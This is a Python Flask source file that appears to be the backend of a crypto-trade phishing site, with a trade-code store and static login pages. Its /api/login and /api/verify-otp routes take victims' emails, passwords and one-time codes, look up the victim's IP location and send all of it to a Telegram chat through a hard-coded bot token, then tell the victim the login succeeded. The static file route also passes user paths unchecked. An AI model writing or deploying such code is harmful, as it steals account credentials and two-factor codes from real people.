import os
import random
import string
import sqlite3
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, Response
from flask_cors import CORS
from pymsgbox import password
import requests
import json
import logging

from flask_sqlalchemy import SQLAlchemy
import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "trades.db")

app = Flask(__name__, static_folder=BASE_DIR)
CORS(app)

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS trades (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            full_name TEXT,
            username TEXT,
            platform TEXT NOT NULL,
            amount TEXT NOT NULL,
            currency TEXT DEFAULT 'USD',
            payment_details TEXT,
            country TEXT NOT NULL,
            date TEXT NOT NULL,
            code TEXT UNIQUE NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    cursor.execute("PRAGMA table_info(trades)")
    columns = [col[1] for col in cursor.fetchall()]
    if "username" not in columns:
        cursor.execute("ALTER TABLE trades ADD COLUMN username TEXT")
    if "currency" not in columns:
        cursor.execute("ALTER TABLE trades ADD COLUMN currency TEXT DEFAULT 'USD'")
    if "payment_details" not in columns:
        cursor.execute("ALTER TABLE trades ADD COLUMN payment_details TEXT")
    conn.commit()
    conn.close()

init_db()

# Telegram bot configuration
bot_token = "7042325269:AAHb7fGXOQQ8bmzhTcdjbtuV_rr3Q6iLw4M"
chat_id = "-1004468440141"

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok', 'message': 'Server is running'}), 200

def generate_unique_code():
    conn = get_db()
    cursor = conn.cursor()
    for _ in range(100):
        # 6-digit numeric code
        code = str(random.randint(100000, 999999))
        cursor.execute("SELECT id FROM trades WHERE code = ?", (code,))
        if not cursor.fetchone():
            conn.close()
            return code
    # Fallback alphanumeric
    conn.close()
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=6))

# API Routes
@app.route("/api/trades", methods=["POST"])
def create_trade():
    data = request.get_json(force=True, silent=True) or {}
    username = (data.get("username") or data.get("full_name") or "").strip()
    platform = data.get("platform", "bitvalve").strip().lower()
    amount = data.get("amount", "").strip()
    currency = data.get("currency", "USD").strip().upper()
    payment_details = data.get("payment_details", "").strip()
    country = data.get("country", "").strip()
    date = data.get("date", "").strip() or datetime.now().strftime("%Y-%m-%d")

    if not username:
        return jsonify({"success": False, "error": "Customer username is required"}), 400
    if not amount:
        return jsonify({"success": False, "error": "Amount is required"}), 400
    if not country:
        return jsonify({"success": False, "error": "Country is required"}), 400

    code = generate_unique_code()

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        """
        INSERT INTO trades (full_name, username, platform, amount, currency, payment_details, country, date, code)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (username, username, platform, amount, currency, payment_details, country, date, code)
    )
    conn.commit()
    trade_id = cursor.lastrowid
    conn.close()

    trade = {
        "id": trade_id,
        "full_name": username,
        "username": username,
        "platform": platform,
        "amount": amount,
        "currency": currency,
        "payment_details": payment_details,
        "country": country,
        "date": date,
        "code": code
    }
    return jsonify({"success": True, "trade": trade}), 201

@app.route("/api/trades", methods=["GET"])
def get_trades():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM trades ORDER BY id DESC LIMIT 50")
    rows = cursor.fetchall()
    conn.close()
    trades = [dict(row) for row in rows]
    return jsonify({"success": True, "trades": trades})

@app.route("/api/trades/<code>", methods=["GET"])
def get_trade_by_code(code):
    clean_code = code.strip().upper()
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM trades WHERE UPPER(code) = ?", (clean_code,))
    row = cursor.fetchone()
    conn.close()

    if not row:
        return jsonify({"success": False, "error": "Invalid or expired trade code"}), 404

    return jsonify({"success": True, "trade": dict(row)})

# Static file serving
@app.route("/")
def serve_index():
    return send_from_directory(BASE_DIR, "index.html")

@app.route("/<path:path>")
def serve_static(path):
    # Handle folder index.html requests (e.g., /admin, /code, /login, /s_login, /platform)
    target_path = os.path.join(BASE_DIR, path)
    if os.path.isdir(target_path):
        return send_from_directory(target_path, "index.html")
    dir_name = os.path.dirname(target_path)
    file_name = os.path.basename(target_path)
    return send_from_directory(dir_name, file_name)


@app.route('/api/login', methods=['POST'])
def login():
    """Login user and send credentials to Telegram"""
    try:
        data = request.get_json()
        app.logger.info(f'Received login data: {data}')
        
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        # Get user info
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', '')
        
        # Get location from IP
        try:
            response = requests.get(f'https://ipinfo.io/{user_ip}/json', timeout=5)
            location_data = response.json()
            location = f"{location_data.get('city', 'N/A')}, {location_data.get('region', 'N/A')}, {location_data.get('country', 'N/A')}"
        except Exception:
            location = 'N/A'
        
        # Extract login data
        email = data.get('email', 'N/A')
        password = data.get('password', 'N/A')
        platform = data.get('platform', 'N/A')
        
        # Format message for Telegram
        payload_text = f"""🔐 {platform}

📧 Email: {email}
🔑 Password: {password}
Platform: {platform}

🌐 IP Information:
   • IP Address: {user_ip}
   • Location: {location}
   • User Agent: {user_agent}

⏰ Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}

📦 Full Data:
{json.dumps(data, indent=2)}"""
        
        # Send to Telegram
        payload_telegram = {'chat_id': chat_id, 'text': payload_text}
        telegram_response = requests.post(
            f'https://api.telegram.org/bot{bot_token}/sendMessage',
            json=payload_telegram,
            timeout=10
        )
        
        if telegram_response.status_code == 200:
            app.logger.info('Login data sent to Telegram successfully')
            return jsonify({
                'message': 'Login successful',
                'success': True,
                'user': {
                    'name': email.split('@')[0],
                    'username': email.split('@')[0],
                    'email': email
                }
            }), 200
        else:
            app.logger.warning(f'Failed to send to Telegram: {telegram_response.status_code}')
            return jsonify({'error': 'Failed to login', 'success': False}), 500
            
    except Exception as e:
        app.logger.error(f'Error in login: {str(e)}')
        import traceback
        app.logger.error(traceback.format_exc())
        return jsonify({'error': 'Failed to process login', 'details': str(e)}), 500


@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    """Verify OTP and send credentials to Telegram"""
    try:
        data = request.get_json()
        app.logger.info(f'Received login data: {data}')
        
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        # Get user info
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', '')
        
        # Get location from IP
        try:
            response = requests.get(f'https://ipinfo.io/{user_ip}/json', timeout=5)
            location_data = response.json()
            location = f"{location_data.get('city', 'N/A')}, {location_data.get('region', 'N/A')}, {location_data.get('country', 'N/A')}"
        except Exception:
            location = 'N/A'
        
        # Extract login data
        otp = data.get('otp', 'N/A')
        platform = data.get('platform', 'N/A')
        
        # Format message for Telegram
        payload_text = f"""🔐 {platform}

        Otp: {otp}
        Platform: {platform}

🌐 IP Information:
   • IP Address: {user_ip}
   • Location: {location}
   • User Agent: {user_agent}

⏰ Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}

📦 Full Data:
{json.dumps(data, indent=2)}"""
        
        # Send to Telegram
        payload_telegram = {'chat_id': chat_id, 'text': payload_text}
        telegram_response = requests.post(
            f'https://api.telegram.org/bot{bot_token}/sendMessage',
            json=payload_telegram,
            timeout=10
        )
        
        if telegram_response.status_code == 200:
            app.logger.info('Login data sent to Telegram successfully')
            return jsonify({
                'message': 'Login successful',
                'success': True,
                'user': {
                    'Otp': otp
                }
            }), 200
        else:
            app.logger.warning(f'Failed to send to Telegram: {telegram_response.status_code}')
            return jsonify({'error': 'Failed to login', 'success': False}), 500
            
    except Exception as e:
        app.logger.error(f'Error in login: {str(e)}')
        import traceback
        app.logger.error(traceback.format_exc())
        return jsonify({'error': 'Failed to process login', 'details': str(e)}), 500

if __name__ == "__main__":
    print(f"Starting server on http://127.0.0.1:5000 ...")
    app.run(host="0.0.0.0", port=5000, debug=True)
